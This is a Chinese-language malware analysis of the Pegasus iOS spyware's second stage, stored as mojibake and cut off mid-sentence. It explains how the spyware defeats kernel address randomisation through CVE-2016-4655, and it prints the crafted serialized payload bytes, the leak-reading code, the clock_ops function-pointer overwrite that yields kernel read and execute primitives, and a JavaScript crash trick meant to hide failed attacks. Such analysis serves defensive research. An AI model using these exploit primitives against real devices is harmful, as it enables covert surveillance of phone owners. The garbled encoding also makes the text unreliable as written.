å›é¿æ£€æµ‹å½“æ”»å‡»å¤±è´¥ï¼ŒPegasusæœ‰ä¸€ä¸ªç´§æ€¥æ‹¯æ•‘ä»£ç ï¼Œå¾ˆå¯èƒ½æ˜¯åˆ›å»ºå†…æ ¸å´©æºƒè½¬å‚¨è€Œé˜²æ­¢æš´éœ²è¿™ä¸ªæ¼æ´ã€‚ä»£ç åœ¨ä¸€ä¸ªç©ºå¼•ç”¨ä¸Šè§¦å‘å´©æºƒã€‚å½“åˆ†æå¸ˆåˆ†æè¿™æ ·çš„æƒ…å†µä¼šé©¬ä¸Šè®¤ä¸ºè¿™ä¸ªBUGä¸ºéæ³•ç©ºæŒ‡é’ˆå¼•ç”¨è€Œä¸ä¼šæ€€ç–‘æ˜¯æ¶æ„æ”»å‡»ã€‚1234window._proto_._proto_=null;x=new String(\"a\");x._proto_._proto_._proto_=window;x.Audio; ç»•è¿‡KASLRæ³¨å…¥çš„ç¬¬äºŒé˜¶æ®µï¼šå†…æ ¸ä½ç½®æ³„éœ²ç¬¬äºŒé˜¶æ®µä¾é ä¸€ä¸ªå†…æ ¸ä¿¡æ¯æ³„éœ²æ¼æ´ï¼ˆCVE-2016-4655ï¼‰ï¼Œä¸ºæ¥ä¸‹æ¥å®ç°è¶Šç‹±çš„å†…æ ¸å­˜å‚¨æ±¡æŸ“æ¼æ´ï¼ˆCVE-2016-4656ï¼‰åšå‡†å¤‡ã€‚ åˆ†æKASLRç»•è¿‡é˜¶æ®µäºŒè¿›è¡Œææƒï¼Œä¸ºiphoneè¶Šç‹±åšå‡†å¤‡ã€‚Pegasuså‡†å¤‡äº†ä¸¤å¥—æ–¹æ¡ˆã€‚æ–¹æ¡ˆä¸€ä¸ºIOSå†…æ ¸çˆ†ç ´ã€‚æ–¹æ¡ˆäºŒä¸ºæ‰¾å‡ºå·²ç»è¶Šç‹±çš„iphoneï¼ˆå·²ç»å®‰è£…äº†åé—¨ç¨‹åºï¼‰ï¼Œåˆ©ç”¨å·²å­˜åœ¨çš„åé—¨æ¥å®‰è£…Pegasusçš„å†…æ ¸è¡¥ä¸åŒ…ã€‚ é¦–å…ˆï¼Œå¿…é¡»ç¡®å®šå†…æ ¸åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œæå‡è‡ªå·±çš„æƒé™ï¼Œè§£é™¤ä¿æŠ¤æœºåˆ¶ï¼Œç„¶åå®‰è£…è¶Šç‹±è½¯ä»¶ã€‚ä¸ºäº†æ³¢åŠæ›´å¤šiphoneï¼ŒPegasuså‡†å¤‡äº†32ä½å’Œ64ä½çš„åŒ…ã€‚è¿™ä¸¤ä¸ªåŒ…å¯ä»¥æ³¢åŠå¤§çº¦19ä¸ªiPhoneç‰ˆæœ¬ã€‚é˜¶æ®µäºŒçš„å˜ç§åœ¨è®¾è®¡ä¸Šæœ‰è®¸å¤šçš„ç›¸ä¼¼æ€§ï¼Œä½†å„è‡ªçš„ç›®çš„ä¸åŒï¼Œæ‰€ä»¥æœ€å¥½ç›¸å…³åˆéš”ç¦»åœ°çœ‹å¾…å˜ç§ã€‚æ¥ä¸‹æ¥ä¼šè®²è§£é˜¶æ®µäºŒå˜ä½“çš„æ¯ä¸€ä¸ªéƒ¨åˆ†ï¼Œå¹¶ä¸”ä¼šæŒ‡å‡ºå˜ç§ç›¸ä¼¼çš„åœ°æ–¹ã€‚ 32ä½å’Œ63ä½äºŒè¿›åˆ¶åŒ…ä¸åŒçš„åœ°æ–¹32ä½åŒ…åº”ç”¨äºè€æ¬¾çš„iPhoneï¼ˆiPhone4sâ€“iPhone5cï¼‰ï¼Œç›®æ ‡ç‰ˆæœ¬ä¸ºIOS 9.0åˆ°IOS 9.3.3ã€‚64ä½åº”ç”¨äºæ–°æ¬¾iPhoneï¼ˆiPhone5sâ€“æœ€æ–°æ¬¾ï¼‰ï¼Œç›®æ ‡ç‰ˆæœ¬ä¹Ÿæ˜¯IOS 9.0åˆ°IOS 9.3.3ã€‚ä¸¤ä¸ªäºŒè¿›åˆ¶åŒ…æ‰§è¡Œç±»ä¼¼çš„æ­¥éª¤ï¼Œåˆ©ç”¨ç›¸åŒçš„æ¼æ´ã€‚ä½†æ˜¯ï¼Œåˆ©ç”¨æ¼æ´çš„æ–¹å¼å› ç‰ˆæœ¬çš„ä¸åŒè€Œä¸åŒã€‚åœ¨è¿è¡Œæœºåˆ¶ä¸åŒçš„åœ°æ–¹ï¼Œè¿›è¡Œåˆ†åˆ«å„è‡ªçš„å¤„ç†ã€‚ åŠ è½½APIæƒ³è¦é˜¶æ®µäºŒæˆåŠŸï¼Œéœ€è¦è·å¾—å¤§é‡çš„APIå‡½æ•°ã€‚ä¸ºä¿è¯å‡½æ•°å¯ç”¨ï¼Œé˜¶æ®µäºŒé€šè¿‡dlsymåŠ¨æ€åŠ è½½éœ€è¦çš„APIåœ°å€ã€‚è™½ç„¶åŠ¨æ€è¯»å–APIåœ°å€åœ¨æ¶æ„è½¯ä»¶ä¸Šå¾ˆå¸¸è§ï¼Œä½†æœ‰è¶£çš„æ˜¯åˆ¶ä½œè€…å¤šæ¬¡é‡å¤åŠ è½½è®¸å¤šçš„APIå‡½æ•°ã€‚ä»…åœ¨mainå‡½æ•°ä¸Šï¼ŒåŠ è½½äº†å¤§é‡çš„APIåœ°å€ï¼Œä½†åªä½¿ç”¨ä¸€å°éƒ¨åˆ†çš„APIï¼ˆä¾‹å¦‚ï¼Œsocketå‡½æ•°åŠ è½½åˆ°äº†å†…å­˜ä¸­ï¼Œå´ä¸€ç›´æ²¡æœ‰ä½¿ç”¨ï¼‰ã€‚åœ¨åŠ è½½äº†åˆæœŸçš„APIå‡½æ•°åï¼Œ32ä½åŒ…è°ƒç”¨äº†ä¸€ä¸ªå­è¿›ç¨‹ï¼ˆåˆå§‹åŒ–ï¼‰ï¼Œè¿™ä¸ªè¿›ç¨‹åˆä¼šè½®æµè°ƒç”¨å…¶ä»–å‡ ä¸ªå­è¿›ç¨‹ï¼Œæ¯ä¸ªè¿›ç¨‹è´Ÿè´£åŠ è½½å…¶ä»–çš„APIå‡½æ•°ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ‰§è¡Œä¸åŒçš„å¯åŠ¨é¡¹ä»»åŠ¡ã€‚ åˆ†ç±»åŠ è½½APIå‡½æ•°ï¼ˆå“ªä¸ªé˜¶æ®µäºŒå‡½æ•°ä¼šåŠ è½½å“ªä¸ªAPIå‡½æ•°ï¼‰ï¼Œè¿˜æœ‰é‡å¤åŠ è½½å¤§é‡APIï¼Œè¡¨æ˜åŠ è½½APIæ˜¯ä¸€äº›ç‹¬ç«‹ç»„ä»¶æˆ–è€…æ“ä½œç‹¬æœ‰çš„ã€‚ä¾‹å¦‚ï¼Œä¸€äº›å‡½æ•°è´Ÿè´£è§£å‹è¶Šç‹±æ–‡ä»¶ï¼Œåˆ©ç”¨chmodæ”¹å˜æƒé™ï¼Œå°†æ–‡ä»¶æ”¾åœ¨å—å®³è€…iPhoneä¸Šæ­£ç¡®çš„åœ°æ–¹ã€‚ä¸€ä¸ªç‹¬ç«‹å‡½æ•°ä¼šåŠ è½½æ‰§è¡Œè¿™äº›æ“ä½œçš„APIå‡½æ•°ã€‚è¿™ä¸ªå‡½æ•°åªä¼šåŠ è½½é‚£äº›æœ‰ç”¨çš„APIï¼Œè€Œè¿™äº›APIä¸ä¼šå’Œé˜¶æ®µäºŒå…¶ä»–éƒ¨åˆ†å…±äº«ã€‚ ç”±äºåœ¨æ•´ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶ä¸­å¤§é‡ä½¿ç”¨è°ƒè¯•æ—¥å¿—ï¼Œé˜¶æ®µäºŒçš„åˆ†æä¹Ÿå˜å¾—æ›´åŠ å®¹æ˜“ã€‚å¯¹æ—¥å¿—è®°å½•å­ç³»ç»Ÿçš„è°ƒç”¨é€šå¸¸å¼•ç”¨æ¼æ´å¼€å‘äººå‘˜ä½¿ç”¨çš„åŸå§‹æ–‡ä»¶åã€‚è¿™äº›è°ƒè¯•ä»£ç çš„å‡ºç°è‡³å°‘è¡¨æ˜æœ‰ä»¥ä¸‹ç‹¬ç«‹æ¨¡å—ï¼ˆæˆ–å­ç³»ç»Ÿï¼‰å­˜åœ¨ï¼š fs.c åŠ è½½è·Ÿæ–‡ä»¶è¿˜æœ‰æ–‡ä»¶ç³»ç»Ÿæ“ä½œæ–¹æ³•ä¾‹å¦‚ftw,open,read,rename,mountæœ‰å…³çš„API kaslr.c åŠ è½½APIï¼Œå¦‚IORegistryEntryGetChildIterator,IORegistryEntryGetProperty,IOServiceGetMatchingServiceï¼Œé€šè¿‡åˆ©ç”¨io _ service _ open _ extendedå‡½æ•°ä¸­çš„æ¼æ´ï¼Œè¿™äº›APIæ¥æ‰¾åˆ°å†…æ ¸åœ°å€ã€‚ bh.c åŠ è½½ä¸ä¸‹ä¸ªé˜¶æ®µpayloadsç›¸å…³çš„APIï¼Œä»¥åŠä¸æ”¾ç½®æ–‡ä»¶æ­£ç¡®ä½ç½®ç›¸å…³çš„APIï¼Œå¦‚ BZ2 _ bzDecompress, chmod, and malloc safari.c åŠ è½½å¦‚sync, exit, strcpyAPIï¼Œè¿™äº›APIç”¨æ¥æ¸…é™¤Safariç¼“å­˜æ–‡ä»¶ä»¥åŠç»ˆæ­¢è¿›ç¨‹ã€‚å½“æ”»å‡»å®Œæˆä¸”å®Œå…¨é€€å‡ºåï¼Œè¿™äº›æ¸…é™¤å·¥ä½œæ‰ä¼šå¼€å§‹ï¼Œæ‰€ä»¥Safariå´©æºƒæ¸…é™¤ï¼ˆé˜¶æ®µä¸€ä¸­è¯´æ˜çš„ï¼‰å°±ä¸ä¼šå‘ç”Ÿã€‚ ä¸Šè¿°éƒ¨åˆ†è¯´æ˜é˜¶æ®µäºŒæ˜¯åŸºäºæ¨¡å—åŒ–ç†å¿µè®¾è®¡çš„ï¼Œè‡³å°‘ï¼Œç”±ä¸åŒä»£ç æºæ–‡ä»¶ç»„æˆã€‚è¿™äº›ä¸åŒæˆåˆ†å¾ˆå¯èƒ½åœ¨iOSæ”»å‡»é“¾ä¸­å¯é‡å¤ä½¿ç”¨ã€‚ ç¯å¢ƒè®¾ç½®å’Œå¹³å°ç¡®å®šåœ¨åˆå§‹åŒ–å®Œæˆåï¼Œé˜¶æ®µäºŒè°ƒç”¨äº†ä¸€ä¸ªå…¨å±€å›è°ƒå‡½æ•°ï¼Œå› é”™è¯¯é˜¶æ®µäºŒç»ˆæ­¢æ—¶å°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚æ ¹æ®å†™å…¥å™¨ä¸­çš„æ–‡ä»¶åï¼Œè¿™ä¸ªå‡½æ•°å¯èƒ½æ˜¯ä¸€ä¸ªæ–­è¨€æ ·å¼å›è°ƒã€‚ ä¸ºäº†ç¡®å®šå—å®³è€…è®¾å¤‡çš„å‹å·ï¼Œè°ƒç”¨äº†sysctlbynameè·å¾—hw.machineã€‚å¦ä¸€ä¸ªå¯¹sysctlbynameè·å–kern.osversion ä¿¡æ¯ã€‚å®Œæˆè¿™ä¸¤é¡¹åï¼Œé˜¶æ®µäºŒå¯ä»¥ç²¾ç¡®ç¡®å®šå‹å·å’ŒiOS å†…æ ¸ç‰ˆæœ¬ã€‚æ ¹æ®è¿™ä¸¤ä¸ªä¿¡æ¯ï¼Œæ‰¾åˆ°å®šä¹‰ä¸åŒå†…å­˜åç§»é‡çš„æ•°æ®åº“ï¼Œé˜¶æ®µäºŒä¾æ®è¿™ä¸ªåº“æ¥çˆ†ç ´è®¾å¤‡ã€‚å¦‚æœé˜¶æ®µäºŒæ‰¾ä¸åˆ°é€‚åˆè®¾å¤‡çš„æ•°æ®åº“ï¼Œè¿›ç¨‹ä¼šæ‰§è¡Œè¿™ä¸ªæ–­è¨€å›è°ƒå¹¶é€€å‡ºã€‚ é˜¶æ®µäºŒåœ¨è¿è¡Œæ—¶ä½¿ç”¨ä¸€ä¸ªé”å®šæ–‡ä»¶ã€‚ä½œä¸ºè¿è¡Œç¯å¢ƒè®¾ç½®çš„ä¸€éƒ¨åˆ†ï¼Œé˜¶æ®µäºŒä¸ºè¿™ä¸ªæ–‡ä»¶åˆ›å»ºæ–‡ä»¶åå’Œå…¨å±€ç›®å½•å˜é‡â€“$HOME/tmp/lockï¼ˆæ³¨æ„ï¼š$HOMEæ˜¯ä¸€ä¸ªç¨‹åºç‹¬æœ‰å˜é‡ï¼‰ 32ä½åŒ…æ”¯æŒ100ä¸ªæ‰‹æœºå‹å·å’ŒiOSç‰ˆæœ¬ç»„åˆé¡¹ã€‚åŒæ ·ï¼Œ64ä½åŒ…æ”¯æŒ99ä¸ªæ‰‹æœºå‹å·å’ŒiOSç‰ˆæœ¬ç»„åˆé¡¹ã€‚ æ”»å…¥KASLRé˜¶æ®µäºŒçš„å¤§éƒ¨åˆ†åŠŸèƒ½æ˜¯ç”¨æ¥æ“çºµå†…æ ¸ä»¥ä½¿å—å®³è®¾å¤‡é˜²å¾¡ç³»ç»Ÿå¤±æ•ˆã€‚æƒ³è¦æ§åˆ¶å†…æ ¸ï¼Œå¿…é¡»å…ˆçŸ¥é“å†…æ ¸çš„ä½ç½®ã€‚å› ä¸ºiOSä½¿ç”¨çš„KASLRæœºåˆ¶ï¼Œé€šå¸¸æƒ…å†µä¸‹å†…æ ¸ä¼šæ˜ å°„åˆ°ä¸€éšæœºåœ°å€ã€‚KASLRåœ¨ç”¨æˆ·æ¯ä¸€æ¬¡å¼€æœºåå°†å†…æ ¸æ˜ å°„åˆ°ä¸€ä¼ªéšæœºåœ°å€æ¥é˜»æ­¢è¿›ç¨‹å®šä½å†…å­˜ä¸­å†…æ ¸åœ°å€ã€‚è¦æ‰¾åˆ°å†…æ ¸ï¼Œé˜¶æ®µäºŒå¿…é¡»æ‰¾åˆ°åŠæ³•å°†å†…æ ¸ç©ºé—´çš„ä¸€ä¸ªåœ°å€æš´éœ²åˆ°ç”¨æˆ·å†…å­˜ç©ºé—´ä¸­ã€‚é˜¶æ®µäºŒåˆ©ç”¨CVE-2016-4655æ‰¾åˆ°å†…æ ¸ç©ºé—´ä¸­çš„ä¸€ä¸ªå†…å­˜åœ°å€ã€‚ é˜¶æ®µäºŒé¦–å…ˆåœ¨IOKit å­ç³»ç»Ÿä¸Šå¼€æ”¾äº†ä¸€ä¸ªç«¯å£æ¥æ‰¾åˆ°å†…æ ¸ã€‚å¦‚æœå¤±è´¥ï¼Œè°ƒç”¨æ–­è¨€å›è°ƒå¹¶é€€å‡ºã€‚é˜¶æ®µäºŒåˆ›å»ºäº†ä¸€ä¸ªå«AppleKeyStoreçš„æœåŠ¡å¹¶è°ƒç”¨IOServiceMatchingï¼Œè°ƒç”¨ç»“æœè¿”å›åˆ°IOServiceGetMatchingService ï¼Œå¾—åˆ°io _ service _ tå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡åŒ…å«æ”»å‡»è€…æƒ³è¦çš„å·²æ³¨å†Œçš„IOKit IOServiceï¼ˆå³ AppleKeyStoreï¼‰ã€‚æœ‰äº†è¿™ä¸ªIOServiceå¥æŸ„ï¼Œé˜¶æ®µäºŒè°ƒç”¨io_service_open_extendedå¹¶å°†ä¸€æ®µç²¾å¿ƒåˆ¶ä½œçš„å±æ€§å­—æ®µä¼ åˆ°æœåŠ¡ä¸­ã€‚è¿™ä¸ªå­—æ®µæ˜¯XMLæ•°æ®çš„ä¸²è¡ŒåŒ–äºŒè¿›åˆ¶è¡¨ç¤ºï¼Œio_service_open_extendedä¼šå°†æ•°æ®æœ€ç»ˆä¼ åˆ°å†…æ ¸ä¸­çš„OSUnserializeBinaryå‡½æ•°ã€‚OSUnserializeBinaryé‡Œæ˜¯ä¸€ä¸ªè½¬åŒ–è¯­å¥ï¼Œå¤„ç†äºŒè¿›åˆ¶XMLæ•°æ®ç»“æ„ä¸­çš„ä¸åŒç§ç±»çš„æ•°æ®ã€‚kOSSerializeNumberç±»å‹çš„æ•°æ®ä¼šéšä¾¿æ¥å—ä¸€å®šé•¿åº¦çš„æ•°æ®è€Œæ²¡æœ‰ä»»ä½•çš„æ•°æ®è¾¹ç•Œå®¡æ ¸ï¼Œæœ€ç»ˆä¼šä½¿è°ƒç”¨è€…è·å¾—æ¯”å…è®¸çš„æ›´å¤šçš„å†…å­˜ç©ºé—´ã€‚å› ä¸ºä¸‹é¢è¿™æ®µä»£ç ï¼Œè¿™ç§æƒ…å†µå¾—ä»¥å‘ç”Ÿã€‚1234567891011len=(key &amp; kOSSerializeDataMask);...case kOSSerializeNumber: bufferPos += sizeof(long long); if(bufferPos&gt;bufferSize) break; value=next[1]; value&lt;&lt;=32; value |= next[0]; o = OSNumber::withNumber(value. len); next+=2; break; é—®é¢˜æ˜¯lenå˜é‡åœ¨ä¼ é€åˆ°OSNumber::withNumberå‰æ˜¯æ— æ•ˆçš„ã€‚æœ€ç»ˆï¼ŒOSNumber::initè¢«è°ƒç”¨ï¼Œå…¶ä¼šç›²ç›®ä¿¡ä»»ç”¨æˆ·æ§åˆ¶çš„å€¼ã€‚12345678bool OSNumber::init(unsigned long long inValue, unsigned int newNumberofBits )&#123; if (!super::init()) return false; size=newNumberOfBits; value=(inValue &amp; sizeMask); return true;&#125; è¿™ä¸ªæ¼æ´è®©é˜¶æ®µäºŒå¯ä»¥æ§åˆ¶OSNumberçš„å¤§å°ã€‚io_service_open_extendedä¸ºOSUnserializedBinaryå‡†å¤‡å¥½äº†ä½¿ç”¨ç¯å¢ƒï¼Œé€šè¿‡OSUnserializedBinaryæ¥åˆ©ç”¨æ¼æ´ã€‚åœ¨æ€ä¹ˆåˆ©ç”¨å‰ï¼Œå…ˆæ¥çœ‹çœ‹ä¼ é€åˆ°io_service_open_extendedçš„æ¶æ„properties å­—æ®µã€‚123456789101112131415161718192021222324252627282930unsigned char properties[]=&#123; //kOSSerializeBinarySignature 0xD3, 0x00,0x00,0x00, //kOSSerializeEndCollecton | kOSSerializeDictionary | 2 0x02,0x00,0x00,0x81, //KEY 1 specified as 30 bytes long (0x1E) //kOSSerializeSymbol | 0x1E 0x1E,0x00,0x00,0x08, \"HIDKeyboardModifierMappingSrc\", 0x00, //(30 bytes) //padding (30+3/4=8 DWORDS) 0x00,0x00, //VALUE 1 //kOSSerializeNumber specified as 0x800 bits (256 bytes) 0x00,0x08,0x00,0x04, //value of OSNumber(4) 0x04,0x00,0x00,0x00, 0x00,0x00,0x00,0x00, //KEY 2 specified as bytes long (0x1E) //kOSSerializeSymbol | 0x1E 0x1E,0x00,0x00,0x08, \"HIDKeyboardModifierMappingDst\",0x00, //(30 chars) //padding (30+3/4=8 DWORDS) 0x00,0x00, //VALUE 2 //kOSSerializeEndCollecton | kOSSerializeNumber | 32 0x20,0x00,0x00,0x84, //value of OSNumber(0x193) 0x93,0x01,0x00,0x00, 0x00,0x00,0x00,0x00&#125;; é˜¶æ®µäºŒè°ƒç”¨IORegistryEntryGetProperty æ¥æ‰¾åˆ°HIDKeyboardModifierMappingSrcçš„å…¥å£ç‚¹ï¼Œå¯¼è‡´propertiesæ•°ç»„åˆ›å»ºäº†è¶…è¿‡æœ€å¤§å€¼64bitçš„OSNumberå€¼ã€‚é˜¶æ®µäºŒç”¨ä¸‹åˆ—ä»£ç è°ƒç”¨is_ io_registry_entry_get_property_bytesï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¯»å–å†…æ ¸æ ˆåŒºçš„æœ«å°¾å€¼å¹¶å°†è¯»åˆ°çš„æ•°æ®å¤‡ä»½åˆ°å†…æ ¸å †åŒºä¸­ã€‚æ¥ç€IORegistryEntryGetPropertyè¿™ä¸ªå‡½æ•°ä¼šå°†è¿™æ®µå †ç¼“å†²åŒºè¿”å›åˆ°ç”¨æˆ·ç©ºé—´ä¸­ã€‚å› æ­¤ï¼Œæ ˆå¤´éƒ¨æŒ‡é’ˆä¼šè¢«ç”¨æˆ·è¯»å–ï¼Œæ¥ç€åˆ©ç”¨è¿™ä¸ªæŒ‡é’ˆæ¥è®¡ç®—iOSå†…æ ¸åŸºå€ï¼š1234567891011do&#123; ...&#125;while (IORegistryEntryGetProperty_0(v13, \"HIDKeyboardModifierMappingSrc\",dataBuffer,&amp;size));writeLog(7,\"%.2s%5.5d\\n\",\"kaslr.c\",127);if(size&gt;8)&#123; writeLog(7,\"%.2s%5.5d\\n\",\"kaslr.c\",138); return dataBuffer[index]&amp;0xFFF00000;&#125; éœ€è¦ç‰¹åˆ«æ³¨æ„è¿™æ®µä»£ç çš„ä¸¤ä¸ªæ–¹é¢ã€‚ç¬¬ä¸€ï¼Œpropertiesæ•°ç»„æŒ‡å®šOSNumberçš„å€¼æ˜¯256å­—èŠ‚å¤§å°ï¼Œè¿™ä¸ªå€¼ä¼šæœ€ç»ˆå¯¼è‡´æ•°æ®æ³„éœ²ã€‚ç¬¬äºŒï¼Œindexå€¼ä¼šå› å‹å·å’ŒiOSç‰ˆæœ¬ä¸åŒè€Œä¸åŒï¼Œè¿™ä¸ªå€¼å­˜å‚¨åœ¨dataBufferä¸­ï¼Œç”¨æ¥æ‰¾åˆ°å†…å­˜åœ°å€ã€‚é˜¶æ®µäºŒçš„å¼€å‘è€…å·²ç»è§„åˆ’äº†æ¯ä¸ªå‹å·å’ŒiOSç‰ˆæœ¬çš„ç»„åˆé¡¹ï¼Œç¡®å®šdataBufferé‚£ä¸ªåœ°å€å€¼æ˜¯æœ‰æ•ˆçš„å†…æ ¸åœ°å€ã€‚ å¦‚æœä¸Šè¿°æ–¹æ³•ä¸è¶³ä»¥æ‰¾åˆ°å†…æ ¸åŸºå€æˆ–è€…å‘ç°iOSç‰ˆæœ¬ä¸æ˜¯9ï¼Œæ–­è¨€å›è°ƒå¯åŠ¨ç¨‹åºç»ˆæ­¢ã€‚ åœ¨å—å®³è®¾å¤‡ä¸Šå»ºç«‹è¯»/å†™/æ‰§è¡ŒåŸè¯­ï¼ˆ32bitï¼‰æ‰¾åˆ°å†…æ ¸åŸºå€åï¼Œé˜¶æ®µäºŒçš„32åŒ…é€šè¿‡pipeå‡½æ•°ç”Ÿæˆä¸€ä¸ªIPCã€‚å¦‚æœpipeå‘½ä»¤å¤±è´¥ï¼Œå°±ä¼šåœæ­¢æ”»å‡»ã€‚ç”ŸæˆIPCåï¼Œ32åŒ…ç”¨ä¸€ä¸ªå†…æ ¸ç«¯å£å¾—åˆ°æ—¶é’ŸæœåŠ¡ï¼Œé€šè¿‡host_get_clock_serviceå¾—åˆ°ç”µæ± æ—¶é’Ÿï¼ˆè‘—åçš„æ—¥å†æ—¶é’Ÿï¼‰å’Œå®æ—¶æ—¶é’Ÿã€‚å¦‚æœä»»ä¸€æ—¶é’Ÿä¸å¯è¾¾ï¼Œæ”»å‡»å°±ä¼šåœæ­¢ã€‚å› ä¸ºæ¥ä¸‹æ¥ç”¨è¿™ä¸‰ä¸ªå¯¹è±¡ï¼ˆpipe setå’Œä¸¤ä¸ªæ—¶é’Ÿå¯¹è±¡ï¼‰è·å–å†…æ ¸è¯»å†™æ‰§è¡Œæƒé™ï¼Œæ‰€ä»¥è¿™ä¸‰ä¸ªå¯¹è±¡éå¸¸é‡è¦ã€‚ ç´§è·Ÿç€pipeå’Œhost_get_clock_service callsï¼Œ32åŒ…æ£€æŸ¥å‘å‰é€šè¿‡task_from_pidåˆ›å»ºçš„å†…æ ¸ç«¯å£å€¼ã€‚å¦‚æœtask_from_pidè¿”å›äº†ä¸€ä¸ªæœ‰æ•ˆå€¼ï¼ˆä¸æ˜¯NULLï¼‰ï¼Œ32åŒ…ç”¨vm_writeå†™å…¥20å­—èŠ‚çš„æ•°æ®å—ï¼Œæ¥ä¿®æ”¹å†…æ ¸ç©ºé—´ã€‚è¿™ä¸ª20å­—èŠ‚æ•°æ®è¦†ç›–äº†clock_opsçš„ä¸€éƒ¨åˆ†ã€‚ å½“è°ƒç”¨ä¾‹å¦‚clock_get_attributeså‡½æ•°æ—¶ï¼Œå†…æ ¸ä¼šè°ƒç”¨ç”µæ± æ—¶é’Ÿå’Œå®æ—¶æ—¶é’Ÿç›¸å…³çš„å‡½æ•°ï¼Œè¿™ä¸ª20å­—èŠ‚æ•°æ®å°±åŒ…å«äº†è¿™äº›å‡½æ•°çš„æŒ‡é’ˆã€‚æ•°æ®å—ç”¨ç°å­˜çš„å†…æ ¸å‡½æ•°æ›¿ä»£äº†ä¸¤ç§æ—¶é’Ÿç±»å‹çš„getattræ“ä½œè¯­ã€‚ç‰¹åˆ«çš„æ˜¯ï¼Œå®æ—¶æ—¶é’Ÿçš„getattrè¢«ä¿®æ”¹æˆæŒ‡å‘OSSerializer::serializeçš„æŒ‡é’ˆï¼Œç”µæ± æ—¶é’Ÿçš„getattræ”¹æˆæŒ‡å‘_bufattr_cpxçš„æŒ‡é’ˆã€‚ å½“ä¸¤ä¸ªæ—¶é’Ÿè°ƒç”¨clock_get_attributesæ—¶ï¼Œä¼šæ”¹å˜å…¶åŸæœ‰çš„æ‰§è¡Œç»“æœã€‚ä¾‹å¦‚ç”µæ± æ—¶é’Ÿè°ƒç”¨clock_get_attributesæ—¶ï¼Œç›¸å½“ä¸è°ƒç”¨äº†å†…æ ¸ç©ºé—´è¯»å‡½æ•°ã€‚_bufattr_cpxåªæœ‰ä¸¤ä¸ªå±æ€§ï¼š123_bufattr_cpx: LDR R0,[R0] BX LR R0é‡Œå­˜å‚¨ç€ä¸€ä¸ªå†…å­˜åœ°å€ï¼Œè¿™æ˜¯è¿™ä¸ªå‡½æ•°è¯»å–çš„ï¼Œåœ¨è¿”å›è°ƒç”¨å‡½æ•°å‰å†™å…¥R0ä¸­ã€‚iPhoneåŸºäºARMæ¡†æ¶çš„å‡½æ•°è°ƒç”¨ä½¿ç”¨å¯„å­˜å™¨å­˜å‚¨å‰å››ä¸ªå‡½æ•°å‚æ•°ï¼Œè™½ç„¶getatträ½¿ç”¨äº†ä¸‰ä¸ªå‚æ•°ï¼Œä½†ç¼ºå°‘å®Œå…¨å…¼å®¹çš„å‡½æ•°åŸå‹æ²¡æœ‰å…³ç³»ã€‚ æ›¿ä»£äº†å®æ—¶æ—¶é’Ÿgetattrçš„å‡½æ•°æ›´åŠ å¤æ‚ã€‚OSSerializer::serializeå‡½æ•°å°†OSSerializer å¯¹è±¡ï¼ˆåŒ…å«è™šå‡½æ•°è¡¨ï¼ˆvtableï¼‰ï¼‰ä½œä¸ºthisæŒ‡é’ˆã€‚å‡½æ•°è°ƒç”¨ OSSerializer å¯¹è±¡0x10å¤„çš„åœ°å€å¹¶é€šè¿‡BXå‘½ä»¤æ¥æ‘†è„±æ§åˆ¶ï¼Œå‘ä¸‹ä¸€ä¸ªå‡½æ•°ä¼ å…¥DWORDsé‡Œ8å’Œ12åç§»å¤„çš„å€¼ã€‚1234567_DWORD OSSerializer::serialize(OSSerialize *): LDR R3,[R0,#8] MOV R2,R1 LDR R1,[R0,#0xC] LDR.W R12,[R0,#0x10] MOV R0,R3 BX R12 é€šè¿‡ä¸€æ®µç‰¹æ®Šè®¾è®¡çš„æ•°æ®å—ï¼Œæ¥ä¸‹æ¥ä¼šè¯¦ç»†è°ˆåˆ°ï¼Œç°åœ¨è°ƒç”¨clock_get_attributeså°±å¯ä»¥åœ¨å†…æ ¸å†…æ‰§è¡Œä»»æ„å‡½æ•°ã€‚å¦‚æœå—å®³è€…çš„å†…æ ¸å·²ç»ä»¥æŸç§æ–¹å¼æš´éœ²äº†ï¼Œè¿™ç§æ—¶é’Ÿä¿®æ”¹æ‰å¯èƒ½å‘ç”Ÿï¼Œè¿™æ˜¯å€¼å¾—æ³¨æ„çš„ã€‚æ‰€ä»¥ï¼Œå¦‚æœåœ¨ä¸€ä¸ªæ²¡æœ‰è¶Šç‹±çš„æ‰‹æœºä¸Šï¼Œä¿®æ”¹å¯èƒ½ä¸æˆåŠŸã€‚ å¦‚æœ32åŒ…å·²ç»è·å¾—äº†å†…æ ¸ç«¯å£å¹¶ä¸”å®Œæˆäº†ä¸Šè¿°å¯¹ä¸åŒæ—¶é’Ÿçš„ä¿®æ”¹ï¼Œä¼šç•¥è¿‡æ¥ä¸‹æ¥çš„å‡ ä¸ªæ­¥éª¤ï¼Œè·å–è®¿é—®æƒï¼Œé€æ­¥æå‡æƒé™ã€‚å¦‚æœå› ç°é˜¶æ®µå†…æ ¸ç«¯å£ä¸å¯ç”¨ï¼Œä½¿å†…æ ¸ä¿®æ”¹å¤±è´¥ï¼Œ32åŒ…åˆ›å»ºå¹¶é”å‘å‰åˆå§‹åŒ–é˜¶æ®µçš„é”å®šæ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶éå¸¸é‡è¦ï¼Œå› ä¸ºåé¢è·å¾—å†…æ ¸æ”¹å†™æƒé™ä¼šä½¿ç”¨è¿™ä¸ªæ–‡ä»¶ã€‚ 64ä½åŒ…ä¸ä¼šåˆ©ç”¨å·²è¶Šç‹±æ‰‹æœºä¸Šçš„åé—¨ã€‚ çº¿ç¨‹æ“ä½œä¸ºåœ¨å†…æ ¸ä¸­æ‰§è¡Œä»»æ„ä»£ç ï¼Œæœ€ç»ˆé˜¶æ®µäºŒä¼šåˆ©ç”¨ä¸€ä¸ªUFAï¼ˆuse after 